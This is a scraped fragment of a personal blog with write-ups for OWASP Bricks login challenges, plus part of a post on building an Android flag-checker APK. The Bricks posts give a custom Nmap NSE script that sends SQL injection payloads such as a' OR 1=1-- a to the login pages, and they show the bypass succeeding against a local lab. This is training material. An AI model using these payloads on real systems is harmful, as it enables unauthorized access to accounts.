id=\"hl-0-18\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-18\"\u003e18\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-19\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-19\"\u003e19\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-lua\" data-lang=\"lua\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e http \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e require \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;http\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e shortport \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e require \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;shortport\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eportrule \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e shortport.http\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaction \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e(host,port)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e resp,final,query\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;username\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;a\u0026#39;) OR 1=1-- a\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;passwd\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;test\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;submit\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Submit\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  resp \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e http.post(host,port,\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/login-3/index.php\u0026#34;\u003c/span\u003e,\u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e,\u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e,r)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  final \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e string.match(resp.body, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  query \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e string.match(resp.body, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e {payload \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e r ,SQLQuery \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e query , result \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e final}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eThis code is built based on \u003ccode\u003ehttp-title.nse\u003c/code\u003e.\u003c/p\u003e","title":"Bricks Login 3"},{"content":"Challenge Information OWASP Bricks Docker version: here This is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by masta ghimau during MCC 2023.\nChallenge Solution Login level 2 is just a simple SQL injection which javascript validation. Since we are using Nmap NSE to perform SQL injection, it will ignore javascript as it is front end validation. We can use the same NSE script as previous challenge.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 local http = require \u0026#34;http\u0026#34; local shortport = require \u0026#34;shortport\u0026#34; portrule = shortport.http action = function(host,port) local resp,final,query r={} r[\u0026#39;username\u0026#39;]=\u0026#34;a\u0026#39; OR 1=1-- a\u0026#34; r[\u0026#39;passwd\u0026#39;]=\u0026#34;test\u0026#34; r[\u0026#39;submit\u0026#39;]=\u0026#34;Submit\u0026#34; resp = http.post(host,port,\u0026#34;/login-2/index.php\u0026#34;,nil,nil,r) final = string.match(resp.body, \u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;) query = string.match(resp.body, \u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;) return {payload = r ,SQLQuery = query , result = final} end This code is built based on http-title.nse.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 nmap -p 80 --script=chall2.nse 127.0.0.1 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 19:52 +08 Nmap scan report for localhost (127.0.0.1) Host is up (0.00013s latency). PORT STATE SERVICE 80/tcp open http | chall1: | payload: | submit: Submit | passwd: test | username: a\u0026#39; OR 1=1-- a | SQLQuery: : SELECT * FROM users WHERE name=\u0026#39;a\u0026#39; OR 1=1-- a\u0026#39; and password=\u0026#39;test\u0026#39; |_ result: Succesfully logged in. Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds Things I learned from the challenge Writing custom NSE script ","permalink":"https://callmeks.github.io/posts/bricks-login-2/","summary":"\u003ch2 id=\"challenge-information\"\u003eChallenge Information\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://sechow.com/bricks/\"\u003eOWASP Bricks\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eDocker version: \u003ca href=\"https://hub.docker.com/r/gjuniioor/owasp-bricks\"\u003ehere\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by \u003ca href=\"https://www.youtube.com/@mastaghimau\"\u003emasta ghimau\u003c/a\u003e during \u003ca href=\"https://cybercamp.my/mcc2023-the-journey-begins/\"\u003eMCC 2023\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"challenge-solution\"\u003eChallenge Solution\u003c/h2\u003e\n\u003cp\u003eLogin level 2 is just a simple SQL injection which javascript validation. Since we are using Nmap NSE to perform SQL injection, it will ignore javascript as it is front end validation. We can use the same NSE script as previous challenge.\u003c/p\u003e","title":"Bricks Login 2"},{"content":"Challenge Information OWASP Bricks Docker version: here This is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by masta ghimau during MCC 2023.\nChallenge Solution Login level 1 is just a simple SQL injection. The hardest part is writing a custom NSE script.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 local http = require \u0026#34;http\u0026#34; local shortport = require \u0026#34;shortport\u0026#34; portrule = shortport.http action = function(host,port) local resp,final,query r={} r[\u0026#39;username\u0026#39;]=\u0026#34;a\u0026#39; OR 1=1-- a\u0026#34; r[\u0026#39;passwd\u0026#39;]=\u0026#34;test\u0026#34; r[\u0026#39;submit\u0026#39;]=\u0026#34;Submit\u0026#34; resp = http.post(host,port,\u0026#34;/login-1/index.php\u0026#34;,nil,nil,r) final = string.match(resp.body, \u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;) query = string.match(resp.body, \u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;) return {payload = r ,SQLQuery = query , result = final} end This code is built based on http-title.nse.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 nmap -p 80 --script=chall1.nse 127.0.0.1 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 19:52 +08 Nmap scan report for localhost (127.0.0.1) Host is up (0.00013s latency). PORT STATE SERVICE 80/tcp open http | chall1: | payload: | submit: Submit | passwd: test | username: a\u0026#39; OR 1=1-- a | SQLQuery: : SELECT * FROM users WHERE name=\u0026#39;a\u0026#39; OR 1=1-- a\u0026#39; and password=\u0026#39;test\u0026#39; |_ result: Succesfully logged in. Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds Things I learned from the challenge Writing custom NSE script ","permalink":"https://callmeks.github.io/posts/bricks-login-1/","summary":"\u003ch2 id=\"challenge-information\"\u003eChallenge Information\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://sechow.com/bricks/\"\u003eOWASP Bricks\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eDocker version: \u003ca href=\"https://hub.docker.com/r/gjuniioor/owasp-bricks\"\u003ehere\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by \u003ca href=\"https://www.youtube.com/@mastaghimau\"\u003emasta ghimau\u003c/a\u003e during \u003ca href=\"https://cybercamp.my/mcc2023-the-journey-begins/\"\u003eMCC 2023\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"challenge-solution\"\u003eChallenge Solution\u003c/h2\u003e\n\u003cp\u003eLogin level 1 is just a simple SQL injection. The hardest part is writing a custom NSE script.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-1\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-1\"\u003e 1\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-2\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-2\"\u003e 2\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-3\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-3\"\u003e 3\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-4\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-4\"\u003e 4\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-5\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-5\"\u003e 5\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-6\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-6\"\u003e 6\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-7\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-7\"\u003e 7\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-8\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-8\"\u003e 8\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-9\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-9\"\u003e 9\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-10\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-10\"\u003e10\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-11\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-11\"\u003e11\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-12\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-12\"\u003e12\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-13\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-13\"\u003e13\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-14\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-14\"\u003e14\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-15\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-15\"\u003e15\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-16\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-16\"\u003e16\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-17\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-17\"\u003e17\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-18\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-18\"\u003e18\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-19\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-19\"\u003e19\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-lua\" data-lang=\"lua\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e http \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e require \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;http\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e shortport \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e require \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;shortport\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eportrule \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e shortport.http\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaction \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e(host,port)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e resp,final,query\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;username\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;a\u0026#39; OR 1=1-- a\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;passwd\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;test\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;submit\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Submit\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  resp \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e http.post(host,port,\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/login-1/index.php\u0026#34;\u003c/span\u003e,\u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e,\u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e,r)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  final \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e string.match(resp.body, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  query \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e string.match(resp.body, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e {payload \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e r ,SQLQuery \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e query , result \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e final}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eThis code is built based on \u003ccode\u003ehttp-title.nse\u003c/code\u003e.\u003c/p\u003e","title":"Bricks Login 1"},{"content":"Overview about the journey I have 0 knowledge about kotlin as well as creating Android APK. Most of the things that I mentioned below is also my first time.\nPART 0 Here\u0026rsquo;s the part where I started out by exploring how to create an Android APK. Basically just tons of youtube vidoes and blogs. The final decision? I just go with Android Studio. The installation is simple but remember to download system image for Virtual Device which is also a part of Android Studio.\nPART 1 Here\u0026rsquo;s the part where I tried the classic \u0026ldquo;hello world\u0026rdquo; in kotlin. It took me some times to understand how it works but learning \u0026ldquo;hello world\u0026rdquo; is useless as I wanted to create an APK that accepts input and check the input after clicking the button. So there\u0026rsquo;s goes another round of youtubes and blogs. The conclusion of this is just keep copy other people\u0026rsquo;s code to understand more about the code.\nHere\u0026rsquo;s something crucial before you move on to the next part if you wanna copy my code, if you paste the code and some of the code turn red, just right click and import whatever its needed. It works 99% of the times.\nPART 2 Here\u0026rsquo;s the part where I\u0026rsquo;ll explain abit of the code that I copy wrote. Lets start with MainAcitiviy.kt, this is the main file where most of the code will be written in a single program since I\u0026rsquo;m writing it for the first time.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class MainActivity : ComponentActivity() { override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) enableEdgeToEdge() setContent { Shroomish_Flag_CheckerTheme { Scaffold( modifier = Modifier.fillMaxSize() ) { innerPadding -\u0026gt; CustomA( modifier = Modifier.padding(innerPadding) ) } } } } } Most of the code in this section is auto-generated. I modified slightly to change the default function into my own function CustomA. As for modifier, you can just think of controlling the behaviour of the function.\n1 2 3 4 @Composable fun CustomA( modifier: Modifier = Modifier) { ... } As I mentioned previously, I created my own function CustomA. A parameter of modifier is required in order to match the innerPadding. Inside the function, I started by including an image as my APK background.\n1 2 Image(painter = painterResource(id = R.drawable.shroomish), contentDescription = null , modifier = modifier.fillMaxSize() ) To do so, go to Resource Manager and Import Drawables. Then just select the images and remain everything as default. After importing the images, you could just use R.drawable.\u0026lt;your-image-name\u0026gt; to retrieve the images.\n1 2 3 4 5 Column(modifier = Modifier.fillMaxSize(), verticalArrangement = Arrangement.Bottom, horizontalAlignment = Alignment.CenterHorizontally){ ... } The next section is Column, which basically arranges everything in vertical sequence. The modifier is just trying to make it center and put it at bottom.\n1 2 3 4 5 6 7 8 9 var a by remember { mutableStateOf(\u0026#34;\u0026#34;) } OutlinedTextField( value = a, onValueChange = { a = it }, label = { Text(\u0026#34;Flag check\u0026#34;) }, shape = RoundedCornerShape(20.dp), modifier = modifier .fillMaxWidth().background(color = Color.White,shape = RoundedCornerShape(20.dp)) ) This section is where I created a text field. Basically the final value will be stored inside a and remaining it just trying to beautify the text field.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 val wee = LocalContext.current.applicationContext Button(onClick = { if(wee().eee(wee().ed(a))){ Toast.makeText(wee, \u0026#34;Correct Flag\u0026#34;, Toast.LENGTH_SHORT).show() } else { Toast.makeText(wee, \u0026#34;Nope\u0026#34;, Toast.LENGTH_SHORT).show() } }, colors = ButtonDefaults.buttonColors(Color.Black), shape = RoundedCornerShape(20.dp), contentPadding = PaddingValues(start=60.dp, end=60.dp,top=8.dp, bottom=8.dp), modifier = modifier.padding(bottom=200.dp) ){ Text(text = \u0026#34;Check Flag\u0026#34;, fontSize = 22.sp, color = Color.White) } This section is the button of the APK. the first line wee variable is actually used for the \u0026ldquo;pop up message\u0026rdquo; in the APK. As written in the code, it will trigger an if-else statement and there will be a message popped if the button was clicked. The remaining of the code is just to beautify the button.\nHere\u0026rsquo;s an overall outcome of the APK:\nWhile it\u0026rsquo;s kind of ugly, it works so lets just move on from there.\nPART 3 If you really read everything, you will probably think that why I did not explain the if-else statement in the button. Thats because it\u0026rsquo;s for PART 3. If you looks closely, you will think that what\u0026rsquo;s wee().eee(wee().ed(a)). Basically, wee() is a class which is stated in another file. Kotlin have this feature where you could just declare the class in any file and still use it on other files without the need of importing it. here\u0026rsquo;s the following code for wee() class.\n1 2 3 4 5 6 7 8 9 class wee { init { System.loadLibrary(\u0026#34;shroomish_flag_checker\u0026#34;) System.loadLibrary(\u0026#34;whatsfun\u0026#34;) } external fun eee(input: String): Boolean external fun ed(input: String): String } This is just a simple class that load\u0026rsquo;s 2 libraries and make the functions available to public. So what libraries are those ? it\u0026rsquo;s actually my own custom library that requires C++.\nPART 4 Here\u0026rsquo;s the part where I\u0026rsquo;ll explain briefly on how you could write C++ and use it in Android APK. To make this work, you will need to go to Tools \u0026gt; SDK Manager \u0026gt; Languages \u0026amp; Frameworks \u0026gt; Android SDK \u0026gt; SDK Tools \u0026gt; **tick** NDK and CMake and press OK to install the needed tools.\nAfter the tools are installed, right click on the app and click Add C++ into Module and just click ok with the default option.\nAfter that, you should get your own C++ files that has alot of comments in it. Just remove it and replace with this.\n1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;jni.h\u0026gt; #include \u0026lt;string\u0026gt; extern \u0026#34;C\u0026#34; JNIEXPORT jstring JNICALL Java_com_example_shroomish_1flag_1checker_wee_ed(JNIEnv* env, jobject /* this */, jstring input) { const char* inputCStr = env-\u0026gt;GetStringUTFChars(input, nullptr); std::string g = std::string(inputCStr); env-\u0026gt;ReleaseStringUTFChars(input, inputCStr); return env-\u0026gt;NewStringUTF(g.c_str()); } The important part of this code is the Java_com_example_shroomish_1flag_1checker_wee_ed. You will need to change it to Java_com_example_\u0026lt;yourproject\u0026gt;_\u0026lt;filename\u0026gt;_\u0026lt;functionname\u0026gt;. Aside from that, most of it are kind of important but you dont really need to know expect that the g is where your input will goes and return will return your strings.\nthis C++ code only returns strings. If you want to return another data type, EXPLORE YOURSELF\nFINAL PART I actually did not explain my own code nor published it in this blog. If you really want to look into my C++ code, you could just go to my github and I have 